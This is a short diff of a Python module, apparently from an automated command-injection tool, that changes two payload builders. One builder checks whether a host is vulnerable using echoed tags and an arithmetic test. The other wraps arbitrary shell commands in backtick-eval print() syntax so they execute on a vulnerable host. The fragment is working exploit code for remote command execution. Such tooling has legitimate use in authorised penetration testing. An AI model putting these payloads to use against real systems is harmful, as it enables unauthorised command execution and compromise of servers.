@@ -20,32 +20,33 @@
 """
 
 # Eval-based decision payload (check if host is vulnerable).
-def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+def decision(separator, TAG, randv1, randv2):
 
   if separator == "":
     payload = ("print(`echo " + TAG + "`." +
-                "`echo " + B64_ENC_TAG + B64_DEC_TRICK + "`." +
+                "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
+                "`echo " + TAG + "`." +
                 "`echo " + TAG + "`);" +
                 separator
               )
     
   else:
     payload = ("print(`echo " + TAG + "" +
-                separator + "echo " + B64_ENC_TAG + B64_DEC_TRICK + "" +
+                separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
+                separator + "echo " + TAG + "" +
                 separator + "echo " + TAG + "`);"
               )
-  
   return payload
 
 # Execute shell commands on vulnerable host.
-def cmd_execution(separator,TAG,cmd):
+def cmd_execution(separator, TAG, cmd):
   
   if separator == "":
-    payload = ("print(`echo '" + TAG + "';" + 
-                "echo '" + TAG + "';" +
-                cmd  +
-                "echo '" + TAG + "';" +
-                "echo '" + TAG + "'`);"
+    payload = ("print(`echo " + TAG + "`." + 
+                "`echo " + TAG + "`." +
+                "`" + cmd + "`." +
+                "`echo " + TAG + "`." +
+                "`echo " + TAG + "`);"
               )
     
   else:
